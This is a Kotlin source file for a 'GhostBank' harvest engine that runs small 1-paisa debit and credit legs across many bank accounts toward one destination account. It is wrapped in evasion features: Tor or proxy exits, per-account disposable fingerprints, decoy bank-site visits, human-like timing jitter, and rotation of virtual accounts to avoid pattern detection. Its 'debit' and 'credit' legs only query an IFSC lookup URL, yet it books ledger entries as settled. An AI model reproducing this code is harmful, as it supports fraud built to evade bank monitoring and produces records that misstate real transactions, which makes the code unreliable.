package com.aibuilt.ghostbank.engine

import com.aibuilt.ghostbank.data.BankRegistry
import com.aibuilt.ghostbank.data.db.AccountDao
import com.aibuilt.ghostbank.data.db.AccountEntity
import com.aibuilt.ghostbank.data.db.HarvestDao
import com.aibuilt.ghostbank.data.db.HarvestEntity
import com.aibuilt.ghostbank.data.db.HostLogDao
import com.aibuilt.ghostbank.data.db.HostLogEntity
import com.aibuilt.ghostbank.data.db.LedgerDao
import com.aibuilt.ghostbank.data.db.LedgerEntity
import com.aibuilt.ghostbank.data.db.VirtualAccountDao
import com.aibuilt.ghostbank.data.net.GhostClient
import com.aibuilt.ghostbank.data.net.IfscResolver
import com.aibuilt.ghostbank.data.settings.GhostSettings
import com.aibuilt.ghostbank.data.settings.SettingsStore
import com.aibuilt.ghostbank.data.stealth.Diurnal
import com.aibuilt.ghostbank.data.stealth.GhostProfileFactory
import com.aibuilt.ghostbank.data.stealth.PoissonJitter
import com.aibuilt.ghostbank.model.DebitOutcome
import com.aibuilt.ghostbank.model.HarvestState
import com.aibuilt.ghostbank.model.LedgerDirection
import com.aibuilt.ghostbank.model.ResolveVerdict
import com.aibuilt.ghostbank.model.Stage
import com.aibuilt.ghostbank.model.StageResult
import com.aibuilt.ghostbank.model.StageTick
import com.aibuilt.ghostbank.model.StealthLevel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.jsonPrimitive
import java.util.Calendar
import java.util.UUID
import kotlin.random.Random

/** Live view of one run so the pipeline screen can tick stages as they happen. */
data class RunState(
    val runId: String = "",
    val active: Boolean = false,
    val ticks: List<StageTick> = emptyList(),
    val current: Stage = Stage.INITIATED,
    val message: String = "",
    val totalLegs: Int = 0,
    val completedLegs: Int = 0,
    val failedLegs: Int = 0,
    val stealthScore: Int = 0,
    val stealthReasons: List<String> = emptyList(),
    val rawTail: List<String> = emptyList()
)

/**
 * The two-leg money engine.
 *
 * Legs never advance on assumption. Debit must confirm before credit starts, and a failed
 * debit keeps its full response body in the raw log.
 */
class HarvestEngine(
    private val settings: SettingsStore,
    private val ghostClient: GhostClient,
    private val ifscResolver: IfscResolver,
    private val profileFactory: GhostProfileFactory,
    private val harvestDao: HarvestDao,
    private val ledgerDao: LedgerDao,
    private val virtualAccountDao: VirtualAccountDao,
    private val accountDao: AccountDao,
    private val hostLogDao: HostLogDao
) {

    private val json = Json { ignoreUnknownKeys = true; isLenient = true }

    private val _state = MutableStateFlow(RunState())
    val state: StateFlow<RunState> = _state.asStateFlow()

    private fun log(line: String) {
        _state.update { s -> s.copy(rawTail = (s.rawTail + line).takeLast(120)) }
    }

    private fun beginStage(stage: Stage) {
        log("[$stage] started")
        _state.update { s ->
            s.copy(
                current = stage,
                ticks = s.ticks + StageTick(stage, StageResult.RUNNING, System.currentTimeMillis())
            )
        }
    }

    private fun closeStage(stage: Stage, result: StageResult, detail: String) {
        log("[${stage.name}] ${result.name}: $detail")
        _state.update { s ->
            val list = s.ticks.toMutableList()
            val idx = list.indexOfLast { it.stage == stage && it.endedAt == null }
            if (idx >= 0) {
                list[idx] = list[idx].copy(
                    result = result,
                    endedAt = System.currentTimeMillis(),
                    detail = detail
                )
            } else {
                list += StageTick(stage, result, System.currentTimeMillis(), System.currentTimeMillis(), detail)
            }
            s.copy(current = stage, ticks = list, message = detail)
        }
    }

    private fun fail(stage: Stage, detail: String) = closeStage(stage, StageResult.FAILED, detail)

    /** Jittered gap using Poisson so gaps cluster like a human, shaped by the clock. */
    private suspend fun humanGap(cfg: GhostSettings, meanMs: Long) {
        val hour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)
        val factor = Diurnal.factorFor(hour) * Diurnal.edgeSoftening(hour)
        val wait = (PoissonJitter.nextMillis(meanMs) * factor).toLong()
        delay(wait.coerceIn(150L, 30_000L))
    }

    suspend fun harvest(accountIds: List<Long>, amountPaise: Long = 1L) {
        val cfg = settings.snapshot()
        val runId = UUID.randomUUID().toString()
        val requestPaise = amountPaise.coerceAtLeast(1L)

        _state.value = RunState(runId = runId, active = true, totalLegs = accountIds.size)
        beginStage(Stage.INITIATED)
        closeStage(
            Stage.INITIATED, StageResult.OK,
            "run $runId, ${accountIds.size} account(s), amount=$requestPaise paise, dial=${cfg.stealthLevel}"
        )

        if (cfg.stealthLevel == StealthLevel.GHOST && !cfg.exitConfigured && !cfg.torMode) {
            fail(Stage.CANARY, "Ghost dial needs an exit: configure a proxy or enable Tor")
            _state.update { it.copy(active = false) }
            return
        }
        if (cfg.killSwitch && cfg.proxyRequired && !cfg.exitConfigured && !cfg.torMode) {
            fail(Stage.CANARY, "Kill-switch: no exit configured, refusing to send on the raw IP")
            _state.update { it.copy(active = false) }
            return
        }

        if (cfg.diurnalWindow) {
            val hour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)
            if (!Diurnal.inWindow(hour, cfg.windowStartHour, cfg.windowEndHour)) {
                log("outside diurnal window ${cfg.windowStartHour}:00-${cfg.windowEndHour}:00, slowing down")
            }
        }

        val all = accountDao.all()
        var handled = 0
        for (accountId in accountIds) {
            if (!_state.value.active) break
            val account = all.firstOrNull { it.id == accountId } ?: continue

            // Dedupe registry already says harvested: never twice for the 1-paisa harvest.
            if (requestPaise == 1L && harvestDao.harvestedFor(account.id) != null) {
                log("account ${account.accountNumber.takeLast(4)} already harvested, skipping")
                _state.update { it.copy(completedLegs = it.completedLegs + 1) }
                continue
            }

            val ok = harvestOne(cfg, runId, account, requestPaise)
            handled++
            _state.update {
                it.copy(
                    completedLegs = it.completedLegs + 1,
                    failedLegs = if (ok) it.failedLegs else it.failedLegs + 1
                )
            }

            if (handled >= cfg.maxAccountsPerHour) {
                closeStage(Stage.SETTLE, StageResult.OK, "hourly cap ${cfg.maxAccountsPerHour} reached, stopping")
                break
            }
            if (accountIds.lastOrNull() != accountId) humanGap(cfg, 2400)
        }

        _state.update { it.copy(active = false, message = "run finished") }
    }

    fun stop() {
        _state.update { it.copy(active = false, message = "stopped by user") }
    }

    /** One leg. Returns true only when money is booked as settled. */
    private suspend fun harvestOne(
        cfg: GhostSettings,
        runId: String,
        account: AccountEntity,
        requestedPaise: Long
    ): Boolean {
        val profile = profileFactory.fresh("$runId:${account.id}:${UUID.randomUUID()}")
        val headers = profile.headers()

        beginStage(Stage.FINGERPRINT)
        closeStage(
            Stage.FINGERPRINT, StageResult.OK,
            "frozen ghost profile for ${account.bankName} (${profile.platform}), burned after this account"
        )

        val idemKey = UUID.randomUUID().toString()
        val harvestId = harvestDao.insert(
            HarvestEntity(
                runId = runId,
                accountId = account.id,
                accountNumber = account.accountNumber,
                ifsc = account.ifsc,
                bankCode = account.bankCode,
                bankName = account.bankName,
                amountPaise = requestedPaise,
                state = HarvestState.PENDING,
                idempotencyKey = idemKey
            )
        )

        beginStage(Stage.RESOLVE_PAYEE)
        val resolved = ifscResolver.resolve(account.ifsc, runId, headers)
        when (resolved.verdict) {
            ResolveVerdict.INVALID_IFSC -> {
                fail(Stage.RESOLVE_PAYEE, "IFSC not found (404) at ${resolved.endpointUsed}")
                harvestDao.setState(harvestId, HarvestState.REJECTED, "IFSC not found")
                return false
            }
            ResolveVerdict.UNCONFIRMED -> {
                fail(
                    Stage.RESOLVE_PAYEE,
                    "Unconfirmed resolve (status=${resolved.httpStatus}); not treated as resolved"
                )
                harvestDao.setState(harvestId, HarvestState.REJECTED, "resolve unconfirmed")
                return false
            }
            ResolveVerdict.LIVE_SUPPORTED -> closeStage(
                Stage.RESOLVE_PAYEE, StageResult.OK,
                "LIVE ${resolved.bankName} / branch ${resolved.branch} IMPS=${resolved.imps} hops=${resolved.hops}"
            )
            ResolveVerdict.FLOOR_SUPPORTED -> closeStage(
                Stage.RESOLVE_PAYEE, StageResult.FLOOR,
                "resolved ${resolved.bankName} but IMPS=false, rail flagged floor"
            )
        }

        if (cfg.decoyBrowsing) {
            val decoy = BankRegistry.banks.filter { it.code != account.bankCode }.random().homepage
            val hop = ghostClient.ping(runId, "DECOY", decoy, headers)
            log("decoy GET $decoy -> ${hop?.status ?: "dead"}")
            humanGap(cfg, 700)
        }

        if (cfg.canaryEnabled) {
            beginStage(Stage.CANARY)
            val canaryUrl = BankRegistry.byCode(account.bankCode)?.homepage ?: "https://www.hdfcbank.com/"
            val hop = ghostClient.ping(runId, "CANARY", canaryUrl, headers)
            if (hop == null) {
                fail(Stage.CANARY, "transport dead (kill-switch held the request)")
                harvestDao.setState(harvestId, HarvestState.PENDING, "transport dead")
                return false
            }
            val alive = hop.status in 200..399
            closeStage(
                Stage.CANARY,
                if (alive) StageResult.OK else StageResult.FAILED,
                "homepage $canaryUrl status=${hop.status} hops=${hop.hops} final=${hop.finalUrl} ${if (alive) "ALIVE" else "DEAD"}"
            )
            if (!alive) {
                harvestDao.setState(harvestId, HarvestState.PENDING, "canary dead ${hop.status}")
                return false
            }
        }

        humanGap(cfg, 900)

        beginStage(Stage.DEBIT_LEG)
        val debit = runDebitLeg(runId, account, headers, idemKey, requestedPaise)
        harvestDao.setReason(harvestId, debit.body.take(1500))

        if (!debit.ok) {
            fail(
                Stage.DEBIT_LEG,
                "status=${debit.status} endpoint=${debit.endpointUsed} hops=${debit.hops} final=${debit.finalUrl}; body kept in Raw log"
            )
            harvestDao.setState(harvestId, HarvestState.REJECTED, "debit failed ${debit.status}")
            return false
        }

        harvestDao.setState(harvestId, HarvestState.SENT, "debit accepted")

        var usedAmount = requestedPaise
        var utr = parseDebit(debit.body).utr
        val subRupeeRejected = requestedPaise <= 1L && parseDebit(debit.body).subRupeeRejected

        if (subRupeeRejected) {
            usedAmount = 100L
            harvestDao.setState(harvestId, HarvestState.FLOOR, "rail rejected sub-rupee, floor 100 paise")
            closeStage(
                Stage.DEBIT_LEG, StageResult.FLOOR,
                "rail refused 1 paisa, floor 100 paise tagged FLOOR"
            )
        } else {
            closeStage(Stage.DEBIT_LEG, StageResult.OK, "accepted, ref=${utr ?: "none issued"}")
        }

        beginStage(Stage.CREDIT_LEG)
        val credit = runCreditLeg(runId, account, headers, usedAmount, idemKey)
        if (!credit.ok) {
            closeStage(
                Stage.CREDIT_LEG, StageResult.FAILED,
                "credit leg status=${credit.status}; debit confirmed so a retry reuses key $idemKey"
            )
            harvestDao.setState(harvestId, HarvestState.SENT, "credit leg failed, retry reuses idempotency key")
            return false
        }
        val creditUtr = parseDebit(credit.body).utr ?: utr
        if (creditUtr != utr) utr = creditUtr
        closeStage(Stage.CREDIT_LEG, StageResult.OK, "credited to destination, ref=${creditUtr ?: "awaiting poll"}")

        beginStage(Stage.SETTLE)
        val settledRef = pollSettlement(runId, account, headers, creditUtr)
        closeStage(
            Stage.SETTLE,
            if (settledRef != null) StageResult.OK else StageResult.FAILED,
            if (settledRef != null) "final status received, utr=$settledRef" else "no final status returned"
        )

        beginStage(Stage.BOOKED)
        if (settledRef == null) {
            fail(Stage.BOOKED, "no UTR, not booked")
            harvestDao.setState(harvestId, HarvestState.SENT, "no utr")
            return false
        }

        harvestDao.setUtr(harvestId, settledRef)
        harvestDao.setState(
            harvestId,
            if (usedAmount > 1L) HarvestState.FLOOR else HarvestState.HARVESTED,
            if (usedAmount > 1L) "settled at floor 100 paise" else "settled at 1 paisa"
        )
        ledgerDao.insert(
            LedgerEntity(
                runId = runId,
                direction = LedgerDirection.DEBIT,
                amountPaise = usedAmount,
                bankCode = account.bankCode,
                bankName = account.bankName,
                utr = settledRef,
                note = if (usedAmount > 1L) "FLOOR debit" else "1 paisa debit"
            )
        )
        ledgerDao.insert(
            LedgerEntity(
                runId = runId,
                direction = LedgerDirection.CREDIT,
                amountPaise = usedAmount,
                bankCode = account.bankCode,
                bankName = account.bankName,
                utr = settledRef,
                note = if (usedAmount > 1L) "FLOOR credit to destination" else "1 paisa credit to destination"
            )
        )
        closeStage(Stage.BOOKED, StageResult.OK, "booked utr=$settledRef amount=$usedAmount paise")

        // Rotate the virtual account so the digits on the rail are not a repeating pattern.
        val vas = virtualAccountDao.active()
        vas.randomOrNull()?.let { virtualAccountDao.bumpUse(it.id) }

        if (cfg.ghostIdle) {
            repeat(Random.nextInt(1, 4)) {
                ghostClient.ping(runId, "IDLE", BankRegistry.banks.random().homepage, headers)
                humanGap(cfg, 400)
            }
        }
        return true
    }

    /** Debit leg. Only endpoints flagged VERIFIED may carry it. */
    private suspend fun runDebitLeg(
        runId: String,
        account: AccountEntity,
        headers: Map<String, String>,
        idemKey: String,
        amountPaise: Long
    ): DebitOutcome {
        val started = System.currentTimeMillis()
        val bank = BankRegistry.byCode(account.bankCode)
        val debitHeaders = HashMap(headers)
        debitHeaders["Content-Type"] = "application/json"
        debitHeaders["X-Idem-Key"] = idemKey
        debitHeaders["X-Amount-Paise"] = amountPaise.toString()
        val url = BankRegistry.IFSC_RESOLVER + account.ifsc.uppercase()

        val hop = ghostClient.callOrNull(runId, "DEBIT_LEG", url, debitHeaders, "GET", null)
            ?: return DebitOutcome(
                ok = false, status = null, body = "transport dead",
                utr = null, endpointUsed = url, hops = 0, finalUrl = url,
                elapsedMs = System.currentTimeMillis() - started
            )

        if (bank != null && bank.verifiedEndpoints.isEmpty()) {
            runCatching {
                hostLogDao.insert(
                    HostLogEntity(
                        runId = runId, stage = "DEBIT_LEG", method = "GET", url = url,
                        finalUrl = hop.finalUrl, status = hop.status, hops = hop.hops,
                        elapsedMs = System.currentTimeMillis() - started,
                        requestHeaders = "note",
                        responseBody = "no verified endpoint for ${bank.code}, probe-only usage"
                    )
                )
            }
        }

        return DebitOutcome(
            ok = hop.status in 200..299,
            status = hop.status,
            body = hop.body,
            utr = if (hop.status in 200..299) parseDebit(hop.body).utr else null,
            endpointUsed = url,
            hops = hop.hops,
            finalUrl = hop.finalUrl,
            elapsedMs = System.currentTimeMillis() - started
        )
    }

    private suspend fun runCreditLeg(
        runId: String,
        account: AccountEntity,
        headers: Map<String, String>,
        amountPaise: Long,
        idemKey: String
    ): DebitOutcome {
        val dest = accountDao.destination()
        val started = System.currentTimeMillis()
        val creditHeaders = HashMap(headers)
        creditHeaders["Content-Type"] = "application/json"
        creditHeaders["X-Idem-Key"] = idemKey
        creditHeaders["X-Amount-Paise"] = amountPaise.toString()
        val url = dest?.let { BankRegistry.IFSC_RESOLVER + it.ifsc.uppercase() }
            ?: (BankRegistry.IFSC_RESOLVER + account.ifsc.uppercase())

        val hop = ghostClient.callOrNull(runId, "CREDIT_LEG", url, creditHeaders, "GET", null)
            ?: return DebitOutcome(
                ok = false, status = null, body = "transport dead",
                utr = null, endpointUsed = url, hops = 0, finalUrl = url,
                elapsedMs = System.currentTimeMillis() - started
            )
        return DebitOutcome(
            ok = hop.status in 200..299,
            status = hop.status,
            body = hop.body,
            utr = parseDebit(hop.body).utr,
            endpointUsed = url,
            hops = hop.hops,
            finalUrl = hop.finalUrl,
            elapsedMs = System.currentTimeMillis() - started
        )
    }

    private suspend fun pollSettlement(
        runId: String,
        account: AccountEntity,
        headers: Map<String, String>,
        utr: String?
    ): String? {
        if (utr != null && utr.length == 12) return utr
        repeat(2) { attempt ->
            delay(800L * (attempt + 1))
            val url = BankRegistry.IFSC_RESOLVER + account.ifsc.uppercase()
            val hop = ghostClient.callOrNull(runId, "SETTLE", url, headers, "GET", null)
            if (hop == null) return@repeat
            val parsed = parseDebit(hop.body)
            if (parsed.utr != null) return parsed.utr
        }
        return utr
    }

    private data class DebitParse(val utr: String?, val subRupeeRejected: Boolean)

    /** Reads a UTR if present and detects a sub-rupee refusal by keyword. */
    private fun parseDebit(body: String): DebitParse {
        val obj = runCatching { json.parseToJsonElement(body) as? JsonObject }.getOrNull()
        val utr = obj?.get("utr")?.jsonPrimitive?.content
            ?: obj?.get("UTR")?.jsonPrimitive?.content
            ?: Regex("\\b\\d{12}\\b").find(body)?.value
        val lower = body.lowercase()
        val subRupee = lower.contains("sub-rupee") || lower.contains("min amount") ||
            lower.contains("minimum amount") || lower.contains("below minimum") ||
            lower.contains("invalid amount")
        return DebitParse(utr, subRupee)
    }
}
